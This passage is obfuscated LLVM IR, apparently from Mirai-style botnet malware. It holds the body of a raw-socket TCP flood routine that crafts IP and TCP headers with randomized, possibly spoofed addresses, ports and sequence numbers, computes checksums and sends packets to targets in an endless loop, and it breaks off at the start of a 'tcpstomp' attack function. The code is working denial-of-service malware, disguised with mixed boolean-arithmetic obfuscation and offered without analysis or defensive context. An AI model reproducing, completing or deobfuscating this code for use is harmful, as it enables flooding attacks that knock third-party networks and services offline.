  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %651

; <label>:109:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 %110, i32 0, i32 3, i8* %111, i32 4) #6
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %117

; <label>:114:                                    ; preds = %109
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 %115)
  br label %651

; <label>:117:                                    ; preds = %109
  store i32 0, i32* %9, align 4
  br label %118

; <label>:118:                                    ; preds = %453, %117
  %119 = load i32, i32* %9, align 4
  %120 = load i8, i8* %5, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  br i1 %122, label %123, label %460

; <label>:123:                                    ; preds = %118
  %124 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %125 = load i8**, i8*** %11, align 8
  %126 = load i32, i32* %9, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8*, i8** %125, i64 %127
  store i8* %124, i8** %128, align 8
  %129 = load i8**, i8*** %11, align 8
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8*, i8** %129, i64 %131
  %133 = load i8*, i8** %132, align 8
  %134 = bitcast i8* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %29, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.tcphdr*
  store %struct.tcphdr* %137, %struct.tcphdr** %30, align 8
  %138 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i64 1
  %140 = bitcast %struct.tcphdr* %139 to i8*
  store i8* %140, i8** %31, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = xor i8 %143, -1
  %145 = xor i8 15, -1
  %146 = xor i8 86, -1
  %147 = or i8 %144, %145
  %148 = or i8 86, %146
  %149 = xor i8 %147, -1
  %150 = and i8 %149, %148
  %151 = and i8 %143, 15
  %152 = xor i8 %150, -1
  %153 = xor i8 64, -1
  %154 = xor i8 -38, -1
  %155 = and i8 %152, -38
  %156 = and i8 %150, %154
  %157 = and i8 %153, -38
  %158 = and i8 64, %154
  %159 = or i8 %155, %156
  %160 = or i8 %157, %158
  %161 = xor i8 %159, %160
  %162 = or i8 %152, %153
  %163 = xor i8 %162, -1
  %164 = or i8 -38, %154
  %165 = and i8 %163, %164
  %166 = or i8 %161, %165
  %167 = or i8 %150, 64
  store i8 %166, i8* %142, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %169 = bitcast %struct.iphdr* %168 to i8*
  %170 = load i8, i8* %169, align 4
  %171 = xor i8 -16, -1
  %172 = xor i8 %170, %171
  %173 = and i8 %172, %170
  %174 = and i8 %170, -16
  %175 = and i8 %173, 5
  %176 = xor i8 %173, 5
  %177 = or i8 %175, %176
  %178 = or i8 %173, 5
  store i8 %177, i8* %169, align 4
  %179 = load i8, i8* %12, align 1
  %180 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 1
  store i8 %179, i8* %181, align 1
  %182 = load i32, i32* %26, align 4
  %183 = sext i32 %182 to i64
  %184 = sub i64 40, -3267966573001334010
  %185 = add i64 %184, %183
  %186 = add i64 %185, -3267966573001334010
  %187 = add i64 40, %183
  %188 = trunc i64 %186 to i16
  %189 = call zeroext i16 @htons(i16 zeroext %188) #7
  %190 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 2
  store i16 %189, i16* %191, align 2
  %192 = load i16, i16* %13, align 2
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 3
  store i16 %193, i16* %195, align 4
  %196 = load i8, i8* %14, align 1
  %197 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 5
  store i8 %196, i8* %198, align 4
  %199 = load i8, i8* %15, align 1
  %200 = icmp ne i8 %199, 0
  br i1 %200, label %201, label %205

; <label>:201:                                    ; preds = %123
  %202 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %203 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 4
  store i16 %202, i16* %204, align 2
  br label %205

; <label>:205:                                    ; preds = %201, %123
  %206 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 6
  store i8 6, i8* %207, align 1
  %208 = load i32, i32* %28, align 4
  %209 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 8
  store i32 %208, i32* %210, align 4
  %211 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %212 = load i32, i32* %9, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i64 %213
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %214, i32 0, i32 1
  %216 = load i32, i32* %215, align 4
  %217 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 9
  store i32 %216, i32* %218, align 4
  %219 = load i16, i16* %16, align 2
  %220 = call zeroext i16 @htons(i16 zeroext %219) #7
  %221 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %222 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %221, i32 0, i32 0
  store i16 %220, i16* %222, align 4
  %223 = load i16, i16* %17, align 2
  %224 = call zeroext i16 @htons(i16 zeroext %223) #7
  %225 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %226 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %225, i32 0, i32 1
  store i16 %224, i16* %226, align 2
  %227 = load i32, i32* %18, align 4
  %228 = trunc i32 %227 to i16
  %229 = call zeroext i16 @htons(i16 zeroext %228) #7
  %230 = zext i16 %229 to i32
  %231 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 2
  store i32 %230, i32* %232, align 4
  %233 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %234 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %233, i32 0, i32 4
  %235 = load i16, i16* %234, align 4
  %236 = xor i16 %235, -1
  %237 = xor i16 -241, -1
  %238 = xor i16 -11732, -1
  %239 = or i16 %236, %237
  %240 = or i16 -11732, %238
  %241 = xor i16 %239, -1
  %242 = and i16 %241, %240
  %243 = and i16 %235, -241
  %244 = and i16 %242, 80
  %245 = xor i16 %242, 80
  %246 = or i16 %244, %245
  %247 = or i16 %242, 80
  store i16 %246, i16* %234, align 4
  %248 = load i8, i8* %20, align 1
  %249 = sext i8 %248 to i16
  %250 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 4
  %252 = load i16, i16* %251, align 4
  %253 = xor i16 %249, -1
  %254 = xor i16 1, -1
  %255 = xor i16 8941, -1
  %256 = or i16 %253, %254
  %257 = or i16 8941, %255
  %258 = xor i16 %256, -1
  %259 = and i16 %258, %257
  %260 = and i16 %249, 1
  %261 = shl i16 %259, 13
  %262 = xor i16 %252, -1
  %263 = xor i16 -8193, -1
  %264 = xor i16 -22916, -1
  %265 = or i16 %262, %263
  %266 = or i16 -22916, %264
  %267 = xor i16 %265, -1
  %268 = and i16 %267, %266
  %269 = and i16 %252, -8193
  %270 = xor i16 %268, -1
  %271 = xor i16 %261, -1
  %272 = xor i16 24320, -1
  %273 = and i16 %270, 24320
  %274 = and i16 %268, %272
  %275 = and i16 %271, 24320
  %276 = and i16 %261, %272
  %277 = or i16 %273, %274
  %278 = or i16 %275, %276
  %279 = xor i16 %277, %278
  %280 = or i16 %270, %271
  %281 = xor i16 %280, -1
  %282 = or i16 24320, %272
  %283 = and i16 %281, %282
  %284 = or i16 %279, %283
  %285 = or i16 %268, %261
  store i16 %284, i16* %251, align 4
  %286 = load i8, i8* %21, align 1
  %287 = sext i8 %286 to i16
  %288 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %289 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %288, i32 0, i32 4
  %290 = load i16, i16* %289, align 4
  %291 = xor i16 %287, -1
  %292 = xor i16 1, -1
  %293 = xor i16 -30142, -1
  %294 = or i16 %291, %292
  %295 = or i16 -30142, %293
  %296 = xor i16 %294, -1
  %297 = and i16 %296, %295
  %298 = and i16 %287, 1
  %299 = shl i16 %297, 12
  %300 = xor i16 %290, -1
  %301 = xor i16 -4097, -1
  %302 = xor i16 4875, -1
  %303 = or i16 %300, %301
  %304 = or i16 4875, %302
  %305 = xor i16 %303, -1
  %306 = and i16 %305, %304
  %307 = and i16 %290, -4097
  %308 = and i16 %306, %299
  %309 = xor i16 %306, %299
  %310 = or i16 %308, %309
  %311 = or i16 %306, %299
  store i16 %310, i16* %289, align 4
  %312 = load i8, i8* %22, align 1
  %313 = sext i8 %312 to i16
  %314 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 4
  %316 = load i16, i16* %315, align 4
  %317 = xor i16 1, -1
  %318 = xor i16 %313, %317
  %319 = and i16 %318, %313
  %320 = and i16 %313, 1
  %321 = shl i16 %319, 11
  %322 = xor i16 %316, -1
  %323 = xor i16 -2049, -1
  %324 = xor i16 4988, -1
  %325 = or i16 %322, %323
  %326 = or i16 4988, %324
  %327 = xor i16 %325, -1
  %328 = and i16 %327, %326
  %329 = and i16 %316, -2049
  %330 = and i16 %328, %321
  %331 = xor i16 %328, %321
  %332 = or i16 %330, %331
  %333 = or i16 %328, %321
  store i16 %332, i16* %315, align 4
  %334 = load i8, i8* %23, align 1
  %335 = sext i8 %334 to i16
  %336 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %337 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %336, i32 0, i32 4
  %338 = load i16, i16* %337, align 4
  %339 = xor i16 1, -1
  %340 = xor i16 %335, %339
  %341 = and i16 %340, %335
  %342 = and i16 %335, 1
  %343 = shl i16 %341, 10
  %344 = xor i16 -1025, -1
  %345 = xor i16 %338, %344
  %346 = and i16 %345, %338
  %347 = and i16 %338, -1025
  %348 = xor i16 %346, -1
  %349 = xor i16 %343, -1
  %350 = xor i16 30440, -1
  %351 = and i16 %348, 30440
  %352 = and i16 %346, %350
  %353 = and i16 %349, 30440
  %354 = and i16 %343, %350
  %355 = or i16 %351, %352
  %356 = or i16 %353, %354
  %357 = xor i16 %355, %356
  %358 = or i16 %348, %349
  %359 = xor i16 %358, -1
  %360 = or i16 30440, %350
  %361 = and i16 %359, %360
  %362 = or i16 %357, %361
  %363 = or i16 %346, %343
  store i16 %362, i16* %337, align 4
  %364 = load i8, i8* %24, align 1
  %365 = sext i8 %364 to i16
  %366 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 4
  %368 = load i16, i16* %367, align 4
  %369 = xor i16 1, -1
  %370 = xor i16 %365, %369
  %371 = and i16 %370, %365
  %372 = and i16 %365, 1
  %373 = shl i16 %371, 9
  %374 = xor i16 -513, -1
  %375 = xor i16 %368, %374
  %376 = and i16 %375, %368
  %377 = and i16 %368, -513
  %378 = and i16 %376, %373
  %379 = xor i16 %376, %373
  %380 = or i16 %378, %379
  %381 = or i16 %376, %373
  store i16 %380, i16* %367, align 4
  %382 = load i8, i8* %25, align 1
  %383 = sext i8 %382 to i16
  %384 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 4
  %386 = load i16, i16* %385, align 4
  %387 = xor i16 1, -1
  %388 = xor i16 %383, %387
  %389 = and i16 %388, %383
  %390 = and i16 %383, 1
  %391 = shl i16 %389, 8
  %392 = xor i16 %386, -1
  %393 = xor i16 -257, -1
  %394 = xor i16 30296, -1
  %395 = or i16 %392, %393
  %396 = or i16 30296, %394
  %397 = xor i16 %395, -1
  %398 = and i16 %397, %396
  %399 = and i16 %386, -257
  %400 = xor i16 %398, -1
  %401 = xor i16 %391, -1
  %402 = xor i16 6419, -1
  %403 = and i16 %400, 6419
  %404 = and i16 %398, %402
  %405 = and i16 %401, 6419
  %406 = and i16 %391, %402
  %407 = or i16 %403, %404
  %408 = or i16 %405, %406
  %409 = xor i16 %407, %408
  %410 = or i16 %400, %401
  %411 = xor i16 %410, -1
  %412 = or i16 6419, %402
  %413 = and i16 %411, %412
  %414 = or i16 %409, %413
  %415 = or i16 %398, %391
  store i16 %414, i16* %385, align 4
  %416 = call i32 @rand_next()
  %417 = xor i32 65535, -1
  %418 = xor i32 %416, %417
  %419 = and i32 %418, %416
  %420 = and i32 %416, 65535
  %421 = trunc i32 %419 to i16
  %422 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %423 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %422, i32 0, i32 5
  store i16 %421, i16* %423, align 2
  %424 = load i8, i8* %22, align 1
  %425 = icmp ne i8 %424, 0
  br i1 %425, label %426, label %450

; <label>:426:                                    ; preds = %205
  %427 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %428 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %427, i32 0, i32 4
  %429 = load i16, i16* %428, align 4
  %430 = xor i16 -2049, -1
  %431 = xor i16 %429, %430
  %432 = and i16 %431, %429
  %433 = and i16 %429, -2049
  %434 = xor i16 %432, -1
  %435 = xor i16 2048, -1
  %436 = xor i16 -2850, -1
  %437 = and i16 %434, -2850
  %438 = and i16 %432, %436
  %439 = and i16 %435, -2850
  %440 = and i16 2048, %436
  %441 = or i16 %437, %438
  %442 = or i16 %439, %440
  %443 = xor i16 %441, %442
  %444 = or i16 %434, %435
  %445 = xor i16 %444, -1
  %446 = or i16 -2850, %436
  %447 = and i16 %445, %446
  %448 = or i16 %443, %447
  %449 = or i16 %432, 2048
  store i16 %448, i16* %428, align 4
  br label %450

; <label>:450:                                    ; preds = %426, %205
  %451 = load i8*, i8** %31, align 8
  %452 = load i32, i32* %26, align 4
  call void @rand_str(i8* %451, i32 %452)
  br label %453

; <label>:453:                                    ; preds = %450
  %454 = load i32, i32* %9, align 4
  %455 = sub i32 0, %454
  %456 = sub i32 0, 1
  %457 = add i32 %455, %456
  %458 = sub i32 0, %457
  %459 = add nsw i32 %454, 1
  store i32 %458, i32* %9, align 4
  br label %118

; <label>:460:                                    ; preds = %118
  br label %461

; <label>:461:                                    ; preds = %650, %460
  store i32 0, i32* %9, align 4
  br label %462

; <label>:462:                                    ; preds = %644, %461
  %463 = load i32, i32* %9, align 4
  %464 = load i8, i8* %5, align 1
  %465 = zext i8 %464 to i32
  %466 = icmp slt i32 %463, %465
  br i1 %466, label %467, label %650

; <label>:467:                                    ; preds = %462
  %468 = load i8**, i8*** %11, align 8
  %469 = load i32, i32* %9, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds i8*, i8** %468, i64 %470
  %472 = load i8*, i8** %471, align 8
  store i8* %472, i8** %32, align 8
  %473 = load i8*, i8** %32, align 8
  %474 = bitcast i8* %473 to %struct.iphdr*
  store %struct.iphdr* %474, %struct.iphdr** %33, align 8
  %475 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %476 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %475, i64 1
  %477 = bitcast %struct.iphdr* %476 to %struct.tcphdr*
  store %struct.tcphdr* %477, %struct.tcphdr** %34, align 8
  %478 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %479 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %478, i64 1
  %480 = bitcast %struct.tcphdr* %479 to i8*
  store i8* %480, i8** %35, align 8
  %481 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %482 = load i32, i32* %9, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %481, i64 %483
  %485 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %484, i32 0, i32 2
  %486 = load i8, i8* %485, align 4
  %487 = zext i8 %486 to i32
  %488 = icmp slt i32 %487, 32
  br i1 %488, label %489, label %513

; <label>:489:                                    ; preds = %467
  %490 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %491 = load i32, i32* %9, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %490, i64 %492
  %494 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %493, i32 0, i32 1
  %495 = load i32, i32* %494, align 4
  %496 = call i32 @ntohl(i32 %495) #7
  %497 = call i32 @rand_next()
  %498 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %499 = load i32, i32* %9, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %498, i64 %500
  %502 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %501, i32 0, i32 2
  %503 = load i8, i8* %502, align 4
  %504 = zext i8 %503 to i32
  %505 = lshr i32 %497, %504
  %506 = sub i32 %496, -192510908
  %507 = add i32 %506, %505
  %508 = add i32 %507, -192510908
  %509 = add i32 %496, %505
  %510 = call i32 @htonl(i32 %508) #7
  %511 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %512 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %511, i32 0, i32 9
  store i32 %510, i32* %512, align 4
  br label %513

; <label>:513:                                    ; preds = %489, %467
  %514 = load i32, i32* %28, align 4
  %515 = icmp eq i32 %514, -1
  br i1 %515, label %516, label %520

; <label>:516:                                    ; preds = %513
  %517 = call i32 @rand_next()
  %518 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %519 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %518, i32 0, i32 8
  store i32 %517, i32* %519, align 4
  br label %520

; <label>:520:                                    ; preds = %516, %513
  %521 = load i16, i16* %13, align 2
  %522 = zext i16 %521 to i32
  %523 = icmp eq i32 %522, 65535
  br i1 %523, label %524, label %537

; <label>:524:                                    ; preds = %520
  %525 = call i32 @rand_next()
  %526 = xor i32 %525, -1
  %527 = xor i32 65535, -1
  %528 = xor i32 1512191513, -1
  %529 = or i32 %526, %527
  %530 = or i32 1512191513, %528
  %531 = xor i32 %529, -1
  %532 = and i32 %531, %530
  %533 = and i32 %525, 65535
  %534 = trunc i32 %532 to i16
  %535 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %536 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %535, i32 0, i32 3
  store i16 %534, i16* %536, align 4
  br label %537

; <label>:537:                                    ; preds = %524, %520
  %538 = load i16, i16* %16, align 2
  %539 = zext i16 %538 to i32
  %540 = icmp eq i32 %539, 65535
  br i1 %540, label %541, label %554

; <label>:541:                                    ; preds = %537
  %542 = call i32 @rand_next()
  %543 = xor i32 %542, -1
  %544 = xor i32 65535, -1
  %545 = xor i32 -1692659767, -1
  %546 = or i32 %543, %544
  %547 = or i32 -1692659767, %545
  %548 = xor i32 %546, -1
  %549 = and i32 %548, %547
  %550 = and i32 %542, 65535
  %551 = trunc i32 %549 to i16
  %552 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %553 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %552, i32 0, i32 0
  store i16 %551, i16* %553, align 4
  br label %554

; <label>:554:                                    ; preds = %541, %537
  %555 = load i16, i16* %17, align 2
  %556 = zext i16 %555 to i32
  %557 = icmp eq i32 %556, 65535
  br i1 %557, label %558, label %567

; <label>:558:                                    ; preds = %554
  %559 = call i32 @rand_next()
  %560 = xor i32 65535, -1
  %561 = xor i32 %559, %560
  %562 = and i32 %561, %559
  %563 = and i32 %559, 65535
  %564 = trunc i32 %562 to i16
  %565 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %566 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %565, i32 0, i32 1
  store i16 %564, i16* %566, align 2
  br label %567

; <label>:567:                                    ; preds = %558, %554
  %568 = load i32, i32* %18, align 4
  %569 = icmp eq i32 %568, 65535
  br i1 %569, label %570, label %574

; <label>:570:                                    ; preds = %567
  %571 = call i32 @rand_next()
  %572 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %573 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %572, i32 0, i32 2
  store i32 %571, i32* %573, align 4
  br label %574

; <label>:574:                                    ; preds = %570, %567
  %575 = load i32, i32* %19, align 4
  %576 = icmp eq i32 %575, 65535
  br i1 %576, label %577, label %581

; <label>:577:                                    ; preds = %574
  %578 = call i32 @rand_next()
  %579 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 3
  store i32 %578, i32* %580, align 4
  br label %581

; <label>:581:                                    ; preds = %577, %574
  %582 = load i8, i8* %27, align 1
  %583 = icmp ne i8 %582, 0
  br i1 %583, label %584, label %587

; <label>:584:                                    ; preds = %581
  %585 = load i8*, i8** %35, align 8
  %586 = load i32, i32* %26, align 4
  call void @rand_str(i8* %585, i32 %586)
  br label %587

; <label>:587:                                    ; preds = %584, %581
  %588 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %589 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %588, i32 0, i32 7
  store i16 0, i16* %589, align 2
  %590 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %591 = bitcast %struct.iphdr* %590 to i16*
  %592 = call zeroext i16 @checksum_generic(i16* %591, i32 20)
  %593 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %594 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %593, i32 0, i32 7
  store i16 %592, i16* %594, align 2
  %595 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %596 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %595, i32 0, i32 6
  store i16 0, i16* %596, align 4
  %597 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %598 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %599 = bitcast %struct.tcphdr* %598 to i8*
  %600 = load i32, i32* %26, align 4
  %601 = sext i32 %600 to i64
  %602 = sub i64 0, %601
  %603 = sub i64 20, %602
  %604 = add i64 20, %601
  %605 = trunc i64 %603 to i16
  %606 = call zeroext i16 @htons(i16 zeroext %605) #7
  %607 = load i32, i32* %26, align 4
  %608 = sext i32 %607 to i64
  %609 = add i64 20, 4098906919056998031
  %610 = add i64 %609, %608
  %611 = sub i64 %610, 4098906919056998031
  %612 = add i64 20, %608
  %613 = trunc i64 %611 to i32
  %614 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %597, i8* %599, i16 zeroext %606, i32 %613)
  %615 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %616 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %615, i32 0, i32 6
  store i16 %614, i16* %616, align 4
  %617 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %618 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %617, i32 0, i32 1
  %619 = load i16, i16* %618, align 2
  %620 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %621 = load i32, i32* %9, align 4
  %622 = sext i32 %621 to i64
  %623 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %620, i64 %622
  %624 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %623, i32 0, i32 0
  %625 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %624, i32 0, i32 1
  store i16 %619, i16* %625, align 2
  %626 = load i32, i32* %10, align 4
  %627 = load i8*, i8** %32, align 8
  %628 = load i32, i32* %26, align 4
  %629 = sext i32 %628 to i64
  %630 = add i64 40, -2635565717512830642
  %631 = add i64 %630, %629
  %632 = sub i64 %631, -2635565717512830642
  %633 = add i64 40, %629
  %634 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %635 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %636 = load i32, i32* %9, align 4
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %635, i64 %637
  %639 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %638, i32 0, i32 0
  %640 = bitcast %struct.sockaddr_in* %639 to %struct.sockaddr*
  store %struct.sockaddr* %640, %struct.sockaddr** %634, align 8
  %641 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %642 = load %struct.sockaddr*, %struct.sockaddr** %641, align 8
  %643 = call i64 @sendto(i32 %626, i8* %627, i64 %632, i32 16384, %struct.sockaddr* %642, i32 16)
  br label %644

; <label>:644:                                    ; preds = %587
  %645 = load i32, i32* %9, align 4
  %646 = add i32 %645, 1209310429
  %647 = add i32 %646, 1
  %648 = sub i32 %647, 1209310429
  %649 = add nsw i32 %645, 1
  store i32 %648, i32* %9, align 4
  br label %462

; <label>:650:                                    ; preds = %462
  br label %461

; <label>:651:                                    ; preds = %114, %108
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
